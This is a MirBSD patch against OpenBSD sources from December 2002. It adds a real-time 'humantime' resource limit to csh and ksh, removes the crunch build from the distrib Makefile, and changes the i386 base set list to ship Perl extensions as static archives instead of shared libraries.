>>> http://templeofhate.com/tglaser/MirBSD/index.php

Copyright (c) 2000-2002 by Thorsten "mirabile" Glaser <x86@ePost.de>
Contributors:
Copyright (c) 1968-2002 NOP by the authors of and contributors to C,
    UNIX®, BSD/Berkeley Unix, 386BSD, NetBSD and OpenBSD. The licen-
    ce of the file before patching also applies to the patch, unless
    special provisions are made.

I hereby permit everyone who obtained a copy of this work to distri-
bute, sell, give away, modify, sublicense, merge and use it, freely.
I retain the right to be known as the author of the work. The author
and every single contributor, unless marked with "NOP" above, hereby
waive their right to require additional patent licences for usage of
this work, even if the work could infringe patents hold by them.

The work is provided "as is", with no explicit or implicit warranty.
Use it at your own risk. Neither the author, nor contributors may be
held liable for any damage, directly or indirectly, which originated
by the creation or modification of this work. Since modern computing
devices are error-prone, flawless behaviour cannot be expected.


This diff (/usr/ports/mystuff/diff-metafiles to obsd.diff) is made
against CTM on Tue Dec 31 01:23:30 UTC 2002.

### GENERATOR: @(#)_MirBSD: regen-obsdp.sh,v 1.2 2002/12/20 19:11:26 tg Exp $
### CTM OpenBSD-cvs 2909
Index: src/bin/csh/csh.1
===================================================================
RCS file: /cvs/src/bin/csh/csh.1,v
retrieving revision 1.42
diff -u -r1.42 csh.1
--- src/bin/csh/csh.1	13 Nov 2001 13:59:53 -0000	1.42
+++ src/bin/csh/csh.1	20 Dec 2002 23:24:41 -0000
@@ -1839,6 +1839,9 @@
 .Ar cputime
 (the maximum
 number of cpu-seconds to be used by each process),
+.Ar time
+(the maximum
+number of real seconds to be used by each process),
 .Ar filesize
 (the largest single file that can be created),
 .Ar datasize
Index: src/bin/csh/func.c
===================================================================
RCS file: /cvs/src/bin/csh/func.c,v
retrieving revision 1.15
diff -u -r1.15 func.c
--- src/bin/csh/func.c	9 Jun 2002 05:47:05 -0000	1.15
+++ src/bin/csh/func.c	20 Dec 2002 23:24:41 -0000
@@ -1156,6 +1156,7 @@
     { RLIMIT_MEMLOCK,	"memorylocked",	1024,	"kbytes" },
     { RLIMIT_NPROC,	"maxproc",	1,	"" },
     { RLIMIT_NOFILE,	"openfiles",	1,	"" },
+    { RLIMIT_TIME,	"humantime",	1,	"seconds" },
     { -1,		NULL,		0,	NULL }
 };
 
@@ -1235,17 +1236,17 @@
     }
     switch (*cp) {
     case ':':
-	if (lp->limconst != RLIMIT_CPU)
+	if (lp->limconst != RLIMIT_CPU && lp->limconst != RLIMIT_TIME)
 	    goto badscal;
 	return ((RLIM_TYPE) (f * 60.0 + atof(short2str(cp + 1))));
     case 'h':
-	if (lp->limconst != RLIMIT_CPU)
+	if (lp->limconst != RLIMIT_CPU && lp->limconst != RLIMIT_TIME)
 	    goto badscal;
 	limtail(cp, "hours");
 	f *= 3600.0;
 	break;
     case 'm':
-	if (lp->limconst == RLIMIT_CPU) {
+	if (lp->limconst == RLIMIT_CPU || lp->limconst == RLIMIT_TIME) {
 	    limtail(cp, "minutes");
 	    f *= 60.0;
 	    break;
@@ -1255,19 +1256,19 @@
 	f *= 1024.0 * 1024.0;
 	break;
     case 's':
-	if (lp->limconst != RLIMIT_CPU)
+	if (lp->limconst != RLIMIT_CPU && lp->limconst != RLIMIT_TIME)
 	    goto badscal;
 	limtail(cp, "seconds");
 	break;
     case 'M':
-	if (lp->limconst == RLIMIT_CPU)
+	if (lp->limconst == RLIMIT_CPU || lp->limconst == RLIMIT_TIME)
 	    goto badscal;
 	*cp = 'm';
 	limtail(cp, "megabytes");
 	f *= 1024.0 * 1024.0;
 	break;
     case 'k':
-	if (lp->limconst == RLIMIT_CPU)
+	if (lp->limconst == RLIMIT_CPU || lp->limconst == RLIMIT_TIME)
 	    goto badscal;
 	limtail(cp, "kbytes");
 	f *= 1024.0;
@@ -1314,7 +1315,7 @@
 
     if (limit == RLIM_INFINITY)
 	(void) fprintf(cshout, "unlimited");
-    else if (lp->limconst == RLIMIT_CPU)
+    else if (lp->limconst == RLIMIT_CPU || lp->limconst == RLIMIT_TIME)
 	psecs((long) limit);
     else
 	(void) fprintf(cshout, "%ld %s", (long) (limit / lp->limdiv),
Index: src/bin/ksh/c_ulimit.c
===================================================================
RCS file: /cvs/src/bin/ksh/c_ulimit.c,v
retrieving revision 1.9
diff -u -r1.9 c_ulimit.c
--- src/bin/ksh/c_ulimit.c	9 Jun 2002 05:47:05 -0000	1.9
+++ src/bin/ksh/c_ulimit.c	20 Dec 2002 23:24:41 -0000
@@ -56,6 +56,9 @@
 #ifdef RLIMIT_CPU
 		{ "time(cpu-seconds)", RLIMIT, RLIMIT_CPU, RLIMIT_CPU, 1, 't' },
 #endif
+#ifdef RLIMIT_TIME
+		{ "humantime(seconds)", RLIMIT, RLIMIT_TIME, RLIMIT_TIME, 1, 'T' },
+#endif
 #ifdef RLIMIT_FSIZE
 		{ "file(blocks)", RLIMIT, RLIMIT_FSIZE, RLIMIT_FSIZE, 512, 'f' },
 #else /* RLIMIT_FSIZE */
Index: src/bin/ksh/ksh.1tbl
===================================================================
RCS file: /cvs/src/bin/ksh/ksh.1tbl,v
retrieving revision 1.48
diff -u -r1.48 ksh.1tbl
--- src/bin/ksh/ksh.1tbl	18 Sep 2002 07:33:25 -0000	1.48
+++ src/bin/ksh/ksh.1tbl	20 Dec 2002 23:24:41 -0000
@@ -4018,6 +4018,11 @@
 .Ar n
 .Tn CPU
 seconds to be used by each process.
+.It Fl T Ar n
+Impose a real time limit of
+.Ar n
+.Tn human
+seconds to be used by each process.
 .El
 .Pp
 As far as
Index: src/distrib/Makefile
===================================================================
RCS file: /cvs/src/distrib/Makefile,v
retrieving revision 1.20
diff -u -r1.20 Makefile
--- src/distrib/Makefile	18 Sep 2001 14:31:23 -0000	1.20
+++ src/distrib/Makefile	20 Dec 2002 23:24:41 -0000
@@ -1,23 +1,14 @@
 #	$OpenBSD: Makefile,v 1.20 2001/09/18 14:31:45 jason Exp $
 
 .if	make(obj)
-SUBDIR= special alpha amiga crunch hp300 i386 mac68k macppc mvme68k \
+SUBDIR= special alpha amiga hp300 i386 mac68k macppc mvme68k \
 	mvme88k mvmeppc sparc sparc64 sun3 vax
 .elif	!make(install)
 SUBDIR= special
 .endif
-.if	make(clean) || make(cleandir)
-SUBDIR+=crunch
-.endif
 .if exists(${MACHINE})
 SUBDIR+= ${MACHINE}
 .endif
 SUBDIR+= notes
-
-#all: crunch-tools _SUBDIRUSE
-
-crunch-tools:
-	(cd $(.CURDIR)/crunch; $(MAKE) obj; \
-	 $(MAKE) depend && ${MAKE} && ${SUDO} ${MAKE} DESTDIR= install)
 
 .include <bsd.subdir.mk>
Index: src/distrib/sets/lists/base/md.i386
===================================================================
RCS file: /cvs/src/distrib/sets/lists/base/md.i386,v
retrieving revision 1.341
diff -u -r1.341 md.i386
--- src/distrib/sets/lists/base/md.i386	18 Dec 2002 06:50:16 -0000	1.341
+++ src/distrib/sets/lists/base/md.i386	20 Dec 2002 23:24:41 -0000
@@ -33,48 +33,6 @@
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/cpp0
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/include
 ./usr/lib/gcc-lib/i386-unknown-openbsd3.2/2.95.3/specs
-./usr/lib/lib45.so.2.0
-./usr/lib/libacl.so.6.0
-./usr/lib/libasn1.so.3.0
-./usr/lib/libc.so.29.0
-./usr/lib/libc_r.so.7.0
-./usr/lib/libcrypto.so.9.0
-./usr/lib/libcurses++.so.2.0
-./usr/lib/libcurses.so.9.0
-./usr/lib/libdes.so.8.0
-./usr/lib/libedit.so.1.0
-./usr/lib/libform.so.2.0
-./usr/lib/libg2c.so.7.0
-./usr/lib/libgssapi.so.2.0
-./usr/lib/libiberty.so.5.0
-./usr/lib/libkadm.so.8.0
-./usr/lib/libkafs.so.11.0
-./usr/lib/libkdb.so.7.0
-./usr/lib/libkrb.so.11.0
-./usr/lib/libkrb5.so.5.0
-./usr/lib/libkvm.so.7.0
-./usr/lib/libm.so.1.0
-./usr/lib/libmenu.so.2.0
-./usr/lib/libncurses.so.9.0
-./usr/lib/libnpthread.so.1.0
-./usr/lib/libobjc.so.1.0
-./usr/lib/libocurses.so.4.0
-./usr/lib/libossaudio.so.2.0
-./usr/lib/libotermcap.so.4.0
-./usr/lib/libpanel.so.2.0
-./usr/lib/libpcap.so.2.0
-./usr/lib/libperl.so.8.0
-./usr/lib/libreadline.so.1.0
-./usr/lib/libsectok.so.4.0
-./usr/lib/libskey.so.4.0
-./usr/lib/libssl.so.7.0
-./usr/lib/libstdc++.so.31.0
-./usr/lib/libtermcap.so.9.0
-./usr/lib/libtermlib.so.9.0
-./usr/lib/libusbhid.so.1.0
-./usr/lib/libutil.so.8.0
-./usr/lib/libwrap.so.3.0
-./usr/lib/libz.so.2.0
 ./usr/libdata/perl5/i386-openbsd
 ./usr/libdata/perl5/i386-openbsd/5.8.0
 ./usr/libdata/perl5/i386-openbsd/5.8.0/.packlist
@@ -224,46 +182,43 @@
 ./usr/libdata/perl5/i386-openbsd/5.8.0/Time/HiRes.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/Unicode
 ./usr/libdata/perl5/i386-openbsd/5.8.0/Unicode/Normalize.pm
-./usr/libdata/perl5/i386-openbsd/5.8.0/XS
-./usr/libdata/perl5/i386-openbsd/5.8.0/XS/APItest.pm
-./usr/libdata/perl5/i386-openbsd/5.8.0/XS/Typemap.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/XSLoader.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/attrs.pm
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/B.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/B.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/B.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/C
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/C/C.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/C/C.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/C/C.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/C/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/B/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ByteLoader
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ByteLoader/ByteLoader.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ByteLoader/ByteLoader.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ByteLoader/ByteLoader.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ByteLoader/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Cwd
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Cwd/Cwd.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Cwd/Cwd.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Cwd/Cwd.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Cwd/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File/DB_File.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File/DB_File.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File/DB_File.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File/autosplit.ix
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DB_File/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data/Dumper
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data/Dumper/Dumper.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data/Dumper/Dumper.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data/Dumper/Dumper.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Data/Dumper/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/DProf
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/DProf/DProf.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/DProf/DProf.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/DProf/DProf.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/DProf/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/PPPort
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/PPPort/PPPort.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/PPPort/PPPort.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/PPPort/PPPort.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/PPPort/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/Peek
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/Peek/Peek.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/Peek/Peek.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/Peek/Peek.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Devel/Peek/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest/MD5
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest/MD5/MD5.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest/MD5/MD5.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest/MD5/MD5.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Digest/MD5/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DynaLoader
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DynaLoader/DynaLoader.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DynaLoader/autosplit.ix
@@ -273,75 +228,74 @@
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/DynaLoader/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Byte
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Byte/Byte.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Byte/Byte.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Byte/Byte.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Byte/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/CN
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/CN/CN.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/CN/CN.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/CN/CN.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/CN/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/EBCDIC
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/EBCDIC/EBCDIC.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/EBCDIC/EBCDIC.so
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Encode.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Encode.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/EBCDIC/EBCDIC.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/EBCDIC/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Encode.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/JP
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/JP/JP.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/JP/JP.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/JP/JP.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/JP/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/KR
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/KR/KR.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/KR/KR.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/KR/KR.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/KR/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Symbol
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Symbol/Symbol.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Symbol/Symbol.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Symbol/Symbol.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Symbol/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/TW
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/TW/TW.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/TW/TW.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/TW/TW.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/TW/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Unicode
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Unicode/Unicode.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Unicode/Unicode.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Unicode/Unicode.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/Unicode/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Encode/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Fcntl
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Fcntl/Fcntl.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Fcntl/Fcntl.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Fcntl/Fcntl.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Fcntl/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File/Glob
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File/Glob/Glob.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File/Glob/Glob.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File/Glob/Glob.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/File/Glob/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util/Call
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util/Call/Call.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util/Call/Call.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util/Call/Call.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Filter/Util/Call/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo/Langinfo.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo/Langinfo.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo/Langinfo.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo/autosplit.ix
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/I18N/Langinfo/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IO
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IO/IO.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IO/IO.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IO/IO.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IO/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC/SysV
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC/SysV/SysV.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC/SysV/SysV.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC/SysV/SysV.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/IPC/SysV/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List/Util
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List/Util/Util.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List/Util/Util.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List/Util/Util.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/List/Util/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME/Base64
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME/Base64/Base64.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME/Base64/Base64.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME/Base64/Base64.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/MIME/Base64/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/NDBM_File
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/NDBM_File/NDBM_File.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/NDBM_File/NDBM_File.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/NDBM_File/NDBM_File.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/NDBM_File/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ODBM_File
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ODBM_File/ODBM_File.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ODBM_File/ODBM_File.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ODBM_File/ODBM_File.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/ODBM_File/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Opcode
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Opcode/Opcode.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Opcode/Opcode.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Opcode/Opcode.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Opcode/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/POSIX.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/POSIX.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/POSIX.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/abs.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/alarm.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/assert.al
@@ -370,6 +324,7 @@
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/execvp.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/exit.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/exp.al
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/fabs.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/fclose.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/fcntl.al
@@ -494,29 +449,29 @@
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/POSIX/waitpid.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/encoding
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/encoding/encoding.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/encoding/encoding.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/encoding/encoding.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/encoding/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/scalar
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/scalar/scalar.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/scalar/scalar.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/scalar/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/scalar/scalar.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/via
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/via/via.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/via/via.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/via/extralibs.ld
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/PerlIO/via/via.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/SDBM_File
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/SDBM_File/SDBM_File.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/SDBM_File/SDBM_File.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/SDBM_File/SDBM_File.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/SDBM_File/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Socket
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Socket/Socket.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Socket/Socket.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Socket/Socket.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Socket/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/CAN_FLOCK.al
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/Storable.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/Storable.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/Storable.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/_freeze.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/_retrieve.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/_store.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/_store_fd.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/autosplit.ix
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/fd_retrieve.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/freeze.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/lock_nstore.al
@@ -535,42 +490,35 @@
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Storable/thaw.al
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname/Hostname.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname/Hostname.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname/Hostname.a
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname/autosplit.ix
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Hostname/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Syslog
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Syslog/Syslog.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Syslog/Syslog.so
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Syslog/Syslog.a
+./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Sys/Syslog/extralibs.ld
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time
 ./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time/HiRes
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time/HiRes/HiRes.bs
-./usr/libdata/perl5/i386-openbsd/5.8.0/auto/Time/HiRes/HiRes.so
